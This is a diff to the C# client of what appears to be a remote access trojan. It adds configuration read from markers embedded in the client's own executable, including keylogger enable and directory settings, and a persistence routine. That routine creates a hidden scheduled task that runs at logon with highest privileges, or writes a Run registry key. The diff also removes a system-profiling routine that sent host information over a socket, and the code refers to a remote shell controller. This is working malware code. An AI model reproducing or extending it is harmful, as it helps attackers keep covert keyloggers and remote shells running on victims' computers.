@@ -1,5 +1,7 @@
-﻿using Microsoft.Win32;
+﻿using Client.Models;
+using Microsoft.Win32;
 using System;
+using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Net;
@@ -17,11 +19,18 @@ namespace Client.Controllers.Tools
         public TcpClient clientReconnectTries;
         public bool clientLog;
         public bool stopReconnectTries;
-        private string[] readerFactory = { "host", "port", "recoTries" };
+        private string[] readerFactory = { "host", "port", "recoTries", "clientID", "klEnabled", "klDirectory", "autoStart", "startupName"};
 
         public string host { get; set; }
         public ushort port { get; set; }
         public int numReconnectTries { get; set; }
+        public static string clientID { get; set; }
+        public bool klEnabled { get; set; }
+        public string klDirectory { get; set; }
+        public bool autoStart { get; set; }
+        public static string startupName { get; set; }
+
+
 
         public Boot()
         {
@@ -42,8 +51,11 @@ namespace Client.Controllers.Tools
         public void doSomethingWithReader(string readerFactoIndex)
         {
             StreamReader reader = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
+            
             string readerString = reader.ReadToEnd();
+
             readerString = readerString.Substring(readerString.IndexOf("-START" + readerFactoIndex + "-"), readerString.IndexOf("-END" + readerFactoIndex + "-") - readerString.IndexOf("-START" + readerFactoIndex + "-"));
+
             if (readerFactoIndex == "host")
             {
                 host = readerString.Replace("-START" + readerFactoIndex + "-", "");
@@ -56,53 +68,66 @@ namespace Client.Controllers.Tools
             {
                 numReconnectTries = int.Parse(readerString.Replace("-START" + readerFactoIndex + "-", ""));
             }
+            else if (readerFactoIndex == "clientID")
+            {
+                clientID = readerString.Replace("-START" + readerFactoIndex + "-", "");                
+            }
+            else if (readerFactoIndex == "klEnabled")
+            {
+                klEnabled = (readerString.Replace("-START" + readerFactoIndex + "-", "") == "True" ? true : false);
+            }
+            else if (readerFactoIndex == "klDirectory")
+            {
+                klDirectory = readerString.Replace("-START" + readerFactoIndex + "-", "");
+            }
+            else if(readerFactoIndex == "autoStart")
+            {
+                autoStart = (readerString.Replace("-START" + readerFactoIndex + "-", "") == "True" ? true : false);
+            }
+            else if (readerFactoIndex == "startupName")
+            {
+                startupName = readerString.Replace("-START" + readerFactoIndex + "-", "");
+            }
             else
             {
+                reader.Close();
                 return;
             }
+
+            reader.Close();
         }
 
-        public void getSysInfo()
+        public static bool AddToStartup()
         {
-            string internetCountryCode = null;
-            string internetIpPublic = null;
-            try
+            if (AuthenticationController.getAccountType() == "Admin")
             {
-                //internetCountryCode = RemoteShellController.callCmd("curl", "ipinfo.io/country");
-                //internetIpPublic = RemoteShellController.callCmd("curl", "ipinfo.io/ip");
-            }
-            catch { }
-            string localCountryCode = CultureInfo.CurrentCulture.TwoLetterISOLanguageName;
-            if (localCountryCode == null || localCountryCode.Length != 2)
-            {
-                localCountryCode = "?";
-            }
-            if (internetCountryCode == null || internetCountryCode.Trim().Length != 2)
-            {
-                internetCountryCode = "?";
-            }
-            string architecture = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + ' ';
-            try
-            {
-                if (IntPtr.Size == 8)
+                try
                 {
-                    architecture += "64 Bit";
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                    {
+                        Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + ClientData.currentPath + "\" /rl HIGHEST /f",
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    };
+
+                    Process p = Process.Start(startInfo);
+                    p.WaitForExit(1000);
+                    if (p.ExitCode == 0) return true;
                 }
-                else
+                catch (Exception)
                 {
-                    architecture += "32 Bit";
                 }
 
+                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
+                    true);
             }
-            catch { }
-            architecture += ' ' + localCountryCode.ToUpper();
-            //string envoi = RemoteShellController.callCmd("whoami", "");
-            //string[] splitedSysinfo = envoi.Split('\\');
-            //string clientInfo = splitedSysinfo[1].Trim() + '@' + splitedSysinfo[0].ToUpper() + '§' + architecture + '§' + internetCountryCode.ToUpper();
-            NetworkStream nw = new NetworkStream(socket);
-            TextWriter tw1 = new StreamWriter(nw);
-            //tw1.WriteLine(clientInfo);
-            tw1.Flush();
+            else
+            {
+                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
+                    true);
+            }
         }
     }
 }
